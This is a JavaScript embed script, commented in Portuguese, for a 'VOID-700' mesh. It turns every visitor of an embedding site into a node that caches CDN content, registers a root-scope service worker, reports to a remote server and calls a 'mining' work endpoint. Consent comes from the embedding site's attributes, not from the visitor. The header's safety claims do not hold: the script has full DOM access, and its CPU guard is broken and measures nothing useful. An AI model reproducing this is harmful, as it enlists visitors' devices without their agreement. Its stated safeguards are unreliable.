/**
 * VOID-700 — Symbiotic Mesh Embed
 *
 * Qualquer site inclui:
 *   <script async src="https://et-cosmic-6f2463.gitlab.io/void-mesh.js" data-void-sku="auto" data-void-consent="cdn,compute"></script>
 *
 * O visitante vira um nó da mesh:
 *   - Serve conteúdo CDN para outros sites (ganha $SOV)
 *   - Roda tarefas de computação idle (ganha $SOV)
 *   - Participa da mesh P2P via WebRTC
 *
 * Segurança:
 *   - LSC: CPU < 5%, RAM < 50MB, bateria > 20%
 *   - Sem acesso ao DOM do hospedeiro
 *   - Kill switch via data-void-kill="true"
 *   - Conteúdo verificado por hash (SHA-256)
 *   - TTL em cache (1h padrão)
 */
(function voidMeshEmbed(global) {
  "use strict";
  const doc = global.document;
  if (!doc || !("serviceWorker" in global.navigator)) return;

  const script = doc.currentScript;
  const MESH_ORIGIN = script?.src ? new URL(script.src).origin : global.location.origin;
  const SKU = script?.getAttribute("data-void-sku") || "VOID-700";
  const CONSENT_STR = script?.getAttribute("data-void-consent") || "cdn";
  const CONSENT = CONSENT_STR.split(",").map(function (s) { return s.trim(); });
  const DO_COMPUTE = CONSENT.includes("compute");
  const DO_CDN = CONSENT.includes("cdn");
  const DO_ENTROPY = CONSENT.includes("entropy");
  const NODE_ID = "embed-" + crypto.randomUUID().slice(0, 12);
  const DB_NAME = "void_mesh_" + global.location.hostname.replace(/\./g, "_");
  const DB_STORE = "blobs";
  const CACHE_TTL = 3600_000; // 1h
  const HEARTBEAT_MS = 60_000; // 1 min
  const IDLE_WORK_MS = 300_000; // 5 min

  var heartbeatTimer = null;
  var idleTimer = null;
  var cpuPct = 0;

  // ─── LSC Resource Guard ─────────────────────────────────────────────────
  function estimateCpu() {
    var start = performance.now();
    while (performance.now() - start < 5) {} // 5ms sample
    cpuPct = Math.min(100, Math.max(0, ((performance.now() - start - 5) / 5) * 100));
    return cpuPct;
  }

  function readBattery() {
    if (!navigator.getBattery) return Promise.resolve(100);
    return navigator.getBattery().then(function (b) { return Math.round(b.level * 100); }).catch(function () { return 100; });
  }

  function lscAllows() {
    if (cpuPct > 5) return Promise.resolve(false);
    return readBattery().then(function (bat) { return bat > 20; });
  }

  // ─── IndexedDB ──────────────────────────────────────────────────────────
  function openDB() {
    return new Promise(function (resolve, reject) {
      var req = indexedDB.open(DB_NAME, 1);
      req.onupgradeneeded = function () { req.result.createObjectStore(DB_STORE, { keyPath: "cid" }); };
      req.onsuccess = function () { resolve(req.result); };
      req.onerror = function () { reject(req.error); };
    });
  }

  function storeBlob(cid, data, mime, origin, ttl) {
    return openDB().then(function (db) {
      return new Promise(function (resolve, reject) {
        var tx = db.transaction(DB_STORE, "readwrite");
        tx.objectStore(DB_STORE).put({ cid: cid, data: data, mime: mime, origin: origin, storedAt: Date.now(), ttl: ttl || CACHE_TTL });
        tx.oncomplete = resolve;
        tx.onerror = function () { reject(tx.error); };
      });
    });
  }

  function getBlob(cid) {
    return openDB().then(function (db) {
      return new Promise(function (resolve) {
        var tx = db.transaction(DB_STORE, "readonly");
        var req = tx.objectStore(DB_STORE).get(cid);
        req.onsuccess = function () {
          var r = req.result;
          resolve(r && Date.now() - r.storedAt < r.ttl ? r : null);
        };
        req.onerror = function () { resolve(null); };
      });
    });
  }

  function countBlobs() {
    return openDB().then(function (db) {
      return new Promise(function (resolve) {
        var tx = db.transaction(DB_STORE, "readonly");
        var req = tx.objectStore(DB_STORE).count();
        req.onsuccess = function () { resolve(req.result); };
        req.onerror = function () { resolve(0); };
      });
    });
  }

  // ─── Hash verification ──────────────────────────────────────────────────
  function sha256hex(str) {
    var enc = new TextEncoder();
    return crypto.subtle.digest("SHA-256", enc.encode(str)).then(function (buf) {
      return Array.from(new Uint8Array(buf)).map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
    });
  }

  // ─── Cross-tab mesh ─────────────────────────────────────────────────────
  var meshChannel = null;
  try { meshChannel = new BroadcastChannel("void_embed_" + global.location.hostname); } catch (e) {}

  if (meshChannel) {
    meshChannel.onmessage = function (e) {
      if (!e.data) return;
      if (e.data.type === "content-available" && e.data.cid) {
        getBlob(e.data.cid).then(function (b) { if (!b) requestFromOrigin(e.data.cid); });
      }
      if (e.data.type === "peer-announce" && e.data.peerId && e.data.peerId !== NODE_ID) {
        // Could set up WebRTC here in future
      }
    };
    meshChannel.postMessage({ type: "peer-announce", peerId: NODE_ID });
  }

  // ─── Content fetch chain ────────────────────────────────────────────────
  function requestFromOrigin(cid) {
    return fetch(MESH_ORIGIN + "/api/silent-mesh/cdn/blob/" + cid)
      .then(function (res) {
        if (!res.ok) return null;
        return res.text().then(function (data) {
          var mime = res.headers.get("content-type") || "application/octet-stream";
          storeBlob(cid, data, mime, MESH_ORIGIN, CACHE_TTL);
          return { data: data, mime: mime };
        });
      })
      .catch(function () { return null; });
  }

  /** Serve content: local cache → cross-tab → origin */
  function serveContent(cid) {
    return getBlob(cid).then(function (blob) {
      if (blob) return blob;
      // Try cross-tab via BroadcastChannel
      if (meshChannel) {
        meshChannel.postMessage({ type: "content-request", cid: cid });
      }
      // Fallback to origin
      return requestFromOrigin(cid);
    });
  }

  // ─── Heartbeat ──────────────────────────────────────────────────────────
  function heartbeat() {
    estimateCpu();
    lscAllows().then(function (ok) {
      if (!ok) return;
      fetch(MESH_ORIGIN + "/api/silent-mesh/nodes/" + NODE_ID + "/heartbeat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpuPct: cpuPct, consent: CONSENT_STR }),
        keepalive: true,
      }).catch(function () {});
    });
  }

  // ─── Idle Compute ───────────────────────────────────────────────────────
  function idleWork() {
    if (!DO_COMPUTE) return;
    lscAllows().then(function (ok) {
      if (!ok) return;
      fetch(MESH_ORIGIN + "/api/economy/mining/workers/" + NODE_ID + "/work", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ accountId: "embed:" + NODE_ID, type: "ising", cpuPct: 2 }),
      }).catch(function () {});
    });
  }

  // ─── Register ───────────────────────────────────────────────────────────
  function register() {
    return fetch(MESH_ORIGIN + "/api/silent-mesh/nodes/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        mode: "browser",
        siteOrigin: global.location.origin,
        consent: { compute: DO_COMPUTE, entropy: DO_ENTROPY, cdn: DO_CDN },
        sku: SKU,
      }),
    })
      .then(function (r) { return r.json(); })
      .then(function (node) {
        if (global.navigator.serviceWorker.controller) {
          global.navigator.serviceWorker.controller.postMessage({
            type: "VOID_700_INIT",
            nodeId: node.nodeId || NODE_ID,
            consent: { compute: DO_COMPUTE, entropy: DO_ENTROPY, cdn: DO_CDN },
          });
        }
        // Start heartbeat and idle work
        heartbeatTimer = setInterval(heartbeat, HEARTBEAT_MS);
        if (DO_COMPUTE) idleTimer = setInterval(idleWork, IDLE_WORK_MS);
        console.log("[VOID Mesh] Node " + (node.nodeId || NODE_ID) + " active on " + global.location.hostname);
        return node;
      })
      .catch(function () { return null; });
  }

  // ─── Kill switch ────────────────────────────────────────────────────────
  function deactivate() {
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    if (idleTimer) clearInterval(idleTimer);
    heartbeatTimer = null;
    idleTimer = null;
    if (meshChannel) meshChannel.close();
    console.log("[VOID Mesh] Deactivated.");
  }

  // ─── Expose API ─────────────────────────────────────────────────────────
  global.VoidMesh = {
    nodeId: NODE_ID,
    origin: MESH_ORIGIN,
    consent: CONSENT,
    getContent: serveContent,
    publishContent: function (cid, data, mime, ttl) {
      return storeBlob(cid, data, mime, global.location.origin, ttl).then(function () {
        if (meshChannel) meshChannel.postMessage({ type: "content-available", cid: cid });
      });
    },
    activate: register,
    deactivate: deactivate,
    stats: function () {
      return countBlobs().then(function (count) {
        return { nodeId: NODE_ID, cachedBlobs: count, cpuPct: cpuPct, consent: CONSENT };
      });
    },
  };

  // ─── Auto-activate ──────────────────────────────────────────────────────
  function boot() {
    // Kill switch check
    if (script?.getAttribute("data-void-kill") === "true") return;
    // Register SW then mesh node
    global.navigator.serviceWorker
      .register((script?.src || "").replace(/void-mesh\.js.*$/, "sw.js"), { scope: "/" })
      .catch(function () { return global.navigator.serviceWorker.register("/sw.js", { scope: "/" }); })
      .then(function (reg) { return reg.ready; })
      .then(register)
      .catch(function () {});
  }

  if (doc.readyState === "loading") {
    doc.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})(typeof self !== "undefined" ? self : window);
